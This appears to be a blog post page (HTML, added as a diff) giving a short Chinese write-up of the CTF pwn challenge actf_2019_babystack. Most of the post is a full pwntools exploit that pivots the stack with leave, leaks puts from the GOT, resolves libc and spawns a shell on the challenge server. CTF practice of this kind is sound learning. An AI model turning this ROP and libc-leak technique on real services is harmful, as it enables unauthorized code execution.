@@ -1,0 +1,41 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-actf_2019_babystack-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote(&#34;node3.buuoj.cn&#34;,&#34;28568&#34;) #sh = process(&#34;./ACTF_2019_babystack&#34;) elf = ELF(&#34;./ACTF_2019_babystack&#34;) libc = ELF(&#34;./buu-libc-2.23.so&#34;) sh.sendlineafter(&#34;e?\n>&#34;,str(0xE0)) sh.recvuntil(&#34;at &#34;) stackaddr = int(sh.recvuntil(&#34;\n&#34;,drop = True),base = 16) payload = 'fillfill' +"><meta property="og:image" content><meta property="og:title" content="BUU-actf_2019_babystack-WP"><meta property="og:description" content="一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote(&#34;node3.buuoj.cn&#34;,&#34;28568&#34;) #sh = process(&#34;./ACTF_2019_babystack&#34;) elf = ELF(&#34;./ACTF_2019_babystack&#34;) libc = ELF(&#34;./buu-libc-2.23.so&#34;) sh.sendlineafter(&#34;e?\n>&#34;,str(0xE0)) sh.recvuntil(&#34;at &#34;) stackaddr = int(sh.recvuntil(&#34;\n&#34;,drop = True),base = 16) payload = 'fillfill' +"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-29T10:18:00+00:00"><meta property="article:modified_time" content="2020-12-29T10:18:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-actf_2019_babystack-WP"><meta name=twitter:description content="一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote(&#34;node3.buuoj.cn&#34;,&#34;28568&#34;) #sh = process(&#34;./ACTF_2019_babystack&#34;) elf = ELF(&#34;./ACTF_2019_babystack&#34;) libc = ELF(&#34;./buu-libc-2.23.so&#34;) sh.sendlineafter(&#34;e?\n>&#34;,str(0xE0)) sh.recvuntil(&#34;at &#34;) stackaddr = int(sh.recvuntil(&#34;\n&#34;,drop = True),base = 16) payload = 'fillfill' +"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-actf_2019_babystack-WP</h1><div class=meta>Posted on Dec 29, 2020</div></div><section class=body><p>一道简单的通过leave栈迁移实现更长的rop链的题</p><pre class=wp-block-code><code>#!/usr/bin/env python                                        
+# coding=utf-8                                               
+from pwn import *                                            
+from LibcSearcher import *                                   
+pop_rdi_ret = 0x400ad3                                       
+context(log_level = 'debug')                                 
+                                                             
+sh = remote("node3.buuoj.cn","28568")                        
+#sh = process("./ACTF_2019_babystack")                       
+elf = ELF("./ACTF_2019_babystack")                           
+libc = ELF("./buu-libc-2.23.so")                             
+sh.sendlineafter("e?\n>",str(0xE0))                          
+sh.recvuntil("at ")                                          
+stackaddr = int(sh.recvuntil("\n",drop = True),base = 16)    
+payload  = 'fillfill' + p64(pop_rdi_ret) + p64(elf.got["puts"])
+payload += p64(elf.symbols["puts"]) + p64(0x400800)          
+payload = payload.ljust(0xD0,'a')                            
+payload += p64(stackaddr) + p64(0x400A18)                    
+sh.sendafter('>',payload)                                    
+sh.recvuntil("e~\n")                                         
+puts_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00'))
+LIBC = LibcSearcher('puts',puts_addr)                        
+base = puts_addr - LIBC.dump('puts')                         
+print base                                                   
+                                                             
+sh.sendlineafter("e?\n>",str(0xE0))                          
+sh.recvuntil("at ")                                          
+stackaddr = int(sh.recvuntil("\n",drop = True),base = 16)    
+payload  = 'a'                                               
+payload = payload.ljust(0xD8,'a')                            
+payload += p64(base + 0x10a38c)                              
+sh.sendafter('>',payload)                                    
+                                                             
+sh.interactive()                                               </code></pre><p>和<a href="https://www.cjovi.icu/?p=789">此题</a>类似</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
